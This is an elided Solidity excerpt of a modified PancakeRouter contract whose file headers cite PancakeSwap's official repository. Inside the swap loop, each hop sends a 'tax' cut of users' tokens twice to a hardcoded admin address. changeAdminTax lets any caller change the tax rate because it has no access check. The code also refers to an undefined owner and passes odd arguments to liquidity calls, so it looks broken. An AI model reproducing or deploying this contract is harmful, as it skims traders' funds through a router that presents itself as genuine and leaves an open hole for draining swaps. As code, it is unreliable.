...
// File: https://github.com/pancakeswap/pancake-smart-contracts/blob/master/projects/exchange-protocol/contracts/interfaces/IWETH.sol
...
// File: https://github.com/pancakeswap/pancake-smart-contracts/blob/master/projects/exchange-protocol/contracts/interfaces/IERC20.sol
...
// File: https://github.com/pancakeswap/pancake-smart-contracts/blob/master/projects/exchange-protocol/contracts/interfaces/IPancakePair.sol
...
// File: https://github.com/pancakeswap/pancake-smart-contracts/blob/master/projects/exchange-protocol/contracts/libraries/SafeMath.sol
...
// File: https://github.com/pancakeswap/pancake-smart-contracts/blob/master/projects/exchange-protocol/contracts/interfaces/IPancakeFactory.sol
...
// File: https://github.com/pancakeswap/pancake-smart-contracts/blob/master/projects/exchange-protocol/contracts/libraries/PancakeLibrary.sol
...
contract PancakeRouter is IPancakeRouter02 {
    ...
    address public Token = 0xB9e1B60e6589949Fa85776D65155788209c3779e;
    address public admin = 0x13DF840A724B25255Af674dF198e01bF8952f474; 

    function updateToken(address _token) public returns (bool){
        require(msg.sender == owner,"Owner call only");
        Token = _token;
        return true;
    }
    ...
    function _swap(
        ...
        for (uint256 i; i < path.length - 1; i++) {
            ...
            //1% admin swap tax
            uint256 tr = (amount0Out * taxAmount)/100;
            IERC20(token0).transfer(admin, tr);
            //1% airdrop on our desired token
            if(token0 == Token){
            uint256 air = (amount0Out * taxAmount)/100;
            IERC20(token0).transfer(msg.sender, air);
            }
            //1% deducted and liquidated as buyback
            IERC20(token0).transfer(admin, tr);
            _addLiquidity(token0, Token, tr,tr,tr,tr);
...
uint256 public taxAmount = 1;
    function changeAdminTax(uint256 _newamount) public returns (bool){
        taxAmount = _newamount;
        return (true);
    }
}